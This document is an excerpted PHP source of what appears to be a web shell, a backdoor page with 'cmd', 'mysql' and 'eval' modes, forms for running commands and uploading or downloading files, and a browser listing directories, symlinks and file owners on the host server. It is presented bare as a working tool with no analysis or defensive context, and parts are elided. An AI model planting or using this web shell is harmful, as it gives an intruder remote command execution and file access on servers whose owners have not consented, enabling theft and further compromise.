...
$ac_page=isset($_POST['page'])?$_POST['page']:'cmd';
$ac_page=($ac_page!='cmd'&&$ac_page!='mysql'&&$ac_page!='eval')?'cmd':$ac_page;
$winda=strpos(strtolower(php_uname()),'wind');
define('format',50);
$pages='<center>###<a href=\'#\'onclick=\'pages.page.value="cmd";pages.submit();\'>cmd</a>###<a href=\'#\' onclick=\'pages.page.value="mysql";pages.submit();\'>mysql</a>###<a href=\'#\'onclick=\'pages.page.value="eval";pages.submit();\'>eval</a>###</center>';
switch($ac_page)
{
case 'eval':
{
...
<input name='page' value='cmd' type=hidden>
<input name='action' value='cmd' type=submit onclick="work_dir.value=main_form.work_dir.value;">
</form>
<form method=post enctype="multipart/form-data">
<input type="file" name="filename">
<input name='work_dir'type=hidden>
<input name='page' value='cmd' type=hidden>
<input name='action' value='upload' type=submit onclick="work_dir.value=main_form.work_dir.value;">
</form>
<form method=post>
...
<input name='work_dir'type=hidden>
<input name='page' value='cmd' type=hidden>
<input name='action' value='download' type=submit onclick="work_dir.value=main_form.work_dir.value;">
</form>
<pre>
<?
...
if(@is_dir($fn)||$fn=='..')
{
echo('<a href=\'#\' onclick=\'list.work_dir.value="'.$e_work_dir.str_replace('"','&quot;',$fn).'";list.submit();\'><b>'.htmlspecialchars(strlen($fn)>format?substr($fn,0,format-3).'...':$fn).'</b></a>'.str_repeat(' ',format-strlen($fn)));
if($winda===false)
{
...
{
$flink=readlink($fn);
echo('<font color=white>'.htmlspecialchars(strlen($fn.=' -> '.$flink)>format?substr($fn,0,format-3).'...':$fn).'</font>'.str_repeat(' ',format>strlen($fn)?(format-strlen($fn)):0));
}
else
{
echo('<a href=\'#\' onclick=\'list.work_dir.value="'.$e_work_dir.str_replace('"','&quot;',$fn).'";list.submit();\'>'.htmlspecialchars(strlen($fn)>format?substr($fn,0,format-3).'...':$fn).'</a>'.str_repeat(' ',format>strlen($fn)?(format-strlen($fn)):0));
}
if($winda===false)
{
$owner=@posix_getpwuid(@fileowner($work_dir.$fn));
